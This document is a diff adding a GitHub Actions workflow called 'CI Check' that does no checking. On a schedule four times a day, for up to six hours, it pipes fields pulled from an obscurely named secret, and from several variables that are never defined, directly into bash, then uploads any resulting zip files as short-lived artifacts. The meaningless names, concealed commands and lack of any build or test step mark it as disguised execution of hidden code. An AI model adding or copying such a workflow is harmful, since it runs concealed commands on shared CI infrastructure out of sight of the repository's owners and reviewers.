@@ -1,0 +1,35 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          kmea426: ${{ secrets.kmea426 }}
+        run: |
+          printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
+          echo $cds6535 | jq -r .gl3800 | /bin/bash
+          echo $mo013 | jq -r .ozjas580 | /bin/bash
+          printf '%s' "$y9842" | jq -r .gr90 | /bin/bash
+          echo $e3 | jq -r .ll13 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: msxasIlx
+          path: "*.zip"
+          retention-days: 1
